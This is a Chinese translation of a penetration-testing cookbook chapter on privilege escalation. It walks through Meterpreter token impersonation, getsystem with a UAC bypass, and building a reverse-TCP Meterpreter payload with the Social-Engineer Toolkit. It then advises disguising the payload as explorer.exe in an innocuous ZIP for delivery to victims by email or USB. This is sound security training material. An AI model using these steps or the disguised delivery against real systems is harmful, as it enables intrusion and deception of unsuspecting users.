# 第七章 权限提升

> 作者：Willie L. Pritchett, David De Smet

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

我们已经获得了想要攻击的计算机的权限。于是将权限尽可能提升就非常重要。通常，我们能访问较低权限的用户账户（计算机用户），但是，我们的目标账户可能是管理员账户。这一章中我们会探索几种提升权限的方式。

## 7.1 使用模拟令牌

这个秘籍中，我们会通过使用模拟令牌，模拟网络上的另一个用户。令牌包含用于登录会话和识别用户、用户组合用户权限的安全信息。当用户登入 Windows 系统是，它们会得到一个访问令牌，作为授权会话的一部分。令牌模拟允许我们通过模拟指定用户来提升自己的权限。例如，系统账户可能需要以管理员身份运行来处理特定的任务。并且他通常会在结束后让渡提升的权限。我们会使用这个弱点来提升我们的访问权限。

### 准备

为了执行这个秘籍，我们需要：

+ 内部网络或互联网的连接。

+ 受害者的目标主机

### 操作步骤

我们从 Meterpreter  开始探索模拟令牌。你需要使用 Metasploit  来攻击主机，以便获得 Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得访问权限。

![](img/7-1-1.jpg)

下面是具体步骤：

1.  我们可以在 Meterpreter 使用`incognito`来开始模拟过程：

    ```
    use incognito
    ```
    
2.  展示`incognito`的帮助文档，通过输入`help`命令：

    ```
    help
    ```
    
3.  你会注意到我们有几个可用的选项：

    ![](img/7-1-2.jpg)
    
4.  下面我们打算获得可用用户的列表，这些用户当前登入了系统，或者最近访问过系统。我们可以通过以`-u`执行`list_tokens`命令来完成它。

    ```
    list_tokens –u
    ```
    
    ![](img/7-1-3.jpg)
    
5.  下面，我们执行模拟攻击。语法是`impersonate_token [name of the account to impersonate]`。

    ```
    impersonate_token \\willie-pc\willie 
    ```
    
6.  最后，我们选择一个 shell 命令来运行。如果我们成功了，我们就以另一个用户的身份在使用当前系统。

### 工作原理

这个秘籍中，我们以具有漏洞的主机开始，之后使用 Meterpreter 在这台主机上模拟另一个用户的令牌。模拟攻击的目的是尽可能选择最高等级的用户，最好是同样跨域连接的某个人，并且使用它们的账户来深入挖掘该网络。

## 7.2 本地提权攻击

这个秘籍中，我们会在一台具有漏洞的主机上进行提权。本地提权允许我们访问系统或域的用户账户，从而利用我们所连接的当前系统。

### 准备

为了执行这个秘籍，我们需要：

+ 内部网络或互联网的连接。

+ 使用 Metasploit 框架的具有漏洞的主机。

### 操作步骤

让我们在 Meterpreter shell 中开始执行本地提权攻击。你需要使用 Metasploit 攻击某个主机来获得 Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得主机的访问。

1.  一旦你通过 Metasploit  获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。

    ![](img/7-2-1.jpg)

2.  下面，使用`-h`选项查看`getsystem `的帮助文件：

    ```
    getsystem –h
    ```
    
3.  最后我们不带任何选项来运行`getsystem`：

    ```
    getsystem
    ```
    
    > 如果你尝试获得 Windows 7 主机的访问，你必须在执行`getsystem`命令之前执行`bypassuac `。`bypassuac `允许你绕过[微软的用户账户控制](http://windows.microsoft.com/en-us/windows7/products/ features/user-account-control)。这个命令这样运行：`run post/windows/escalate/bypassuac`。
    
4.  下面，我们执行最后的命令来获取访问。

5.  这就结束了。我们已经成功进行了提权攻击。

### 工作原理

这个秘籍中，我们使用了 Meterpreter 对受害者的主机进行本地提权攻击。我们从 Meterpreter 中开始这个秘籍。之后我们执行了`getsystem `命令，它允许 Meterpreter 尝试在系统中提升我们的证书。如果成功了，我们就有了受害者主机上的系统级访问权限。

## 7.3 掌握社会工程工具包（SET）

这个秘籍中，我们会探索社会工程工具包（SET）。SET 是个包含一些工具的框架，让你能够通过骗术来攻击受害者。SET 由  David Kennedy 设计。这个工具很快就成为了渗透测试者工具库中的标准。

### 操作步骤

掌握 SET 的步骤如下所示。

1.  打开终端窗口，通过按下终端图表，并访问 SET 所在的目录：

    ```
    se-toolkit
    ```
    
2.  完成之后，你会看到 SET 菜单。SET 菜单有如下选项：


    + Social-Engineering Attacks （社会工程攻击）
    + Fast-Track Penetration Testing （快速跟踪渗透测试）
    + Third Party Modules （第三方模块）
    + Update the Metasploit Framework （更新 Metasploit 框架）
    + Update the Social-Engineer Toolkit （更新社会工程工具包）
    + Update SET configuration （更新 SET 配置）
    + Help, Credits, and About （帮助，作者和关于）
    + Exit the Social-Engineer Toolkit（退出社会工程工具包）
    
    > 在进行攻击之前，最好先将升级 SET ，因为作者经常会升级它。
    
    这些选项如下图所示：
    
    ![](img/7-3-1.jpg)
    
3.  出于我们的目的，我们选择第一个选项来开始社会工程攻击：

    ```
    1
    ```
    
4.  我们现在会看到社会工程攻击的列表，它们展示在下面的截图中。出于我们的目的，我们使用` Create a Payload and Listener`（创建载荷和监听器，选项 4）。

    ```
    4
    ```
    
    ![](img/7-3-2.jpg)

5.  下面，我们被询问输入载荷的 IP 来反转链接。这里，我们输入我们的 IP 地址：

    ```
    192.168.10.109
    ```
    
    ![](img/7-3-3.jpg)
    
6.  你会看到载荷的列表和描述，它们为`Payload and Listener`选项生成。选择`Windows Reverse_TCP Meterpreter`。这会让我们连接到目标上，并对其执行 Meterpreter 载荷。

    ```
    2
    ```
    
    ![](img/7-3-4.jpg)
    
7.  最后，我们被询问作为监听器端口的端口号。已经为你选择了 443，所以我们就选择它了。

    ```
    443
    ```
    
8.  一旦载荷准备完毕，你会被询问来启动监听器，输入`Yes`：

    ![](img/7-3-5.jpg)
    
9.  你会注意到 Metasploit 打开了一个处理器。

    ![](img/7-3-6.jpg)
    
### 工作原理

这个秘籍中，我们探索了 SET 的用法。SET 拥有菜单风格的接口，使它易于生成用于欺骗受害者的工具。我们以初始化 SET 开始，之后，SET 为我们提供了几种攻击方式。一旦我们选择了它，SET 会跟 Metasploit 交互，同时询问用户一系列问题。在这个秘籍的最后，我们创建了可执行文件，它会提供给我们目标主机的 Meterpreter  活动会话。

### 更多

作为替代，你可以从桌面上启动 SET，访问`Applications | Kali Linux | Exploitation Tools | Social Engineering Tools | Social Engineering Toolkit | Set`。

**将你的载荷传给受害者**

下面的步骤会将你的载荷传给受害者。

1.  在 SET 目录下，你胡注意到有个 EXE 文件叫做`msf.exe`。推荐你将文件名称修改为不会引起怀疑的名称。这里，我们将它改为`explorer.exe`。最开始，我们打开终端窗口并访问 SET 所在的目录。

    ```
    cd /usr/share/set 
    ```
    
2.  之后我们获得目录中所有项目的列表。

    ```
    ls
    ```
    
3.  之后我们将这个文件重命名为`explorer.exe`：

    ```
    mv msf.exe explorer.exe
    ```
    
    ![](img/7-3-7.jpg)

4.  现在我们压缩` explorer.exe`载荷。这里，ZIP 归档叫做`healthyfiles`。

    ```
    zip healthyfiles explorer.exe 
    ```
    
5.  既然你已经拥有了 ZIP 归档，你可以把文件以多种方式分发给受害者。你可以通过电子邮件来传递，也可以放进 U 盘并手动在受害者机器中打开，以及其它。探索这些机制会给你想要的结果来达成你的目标。
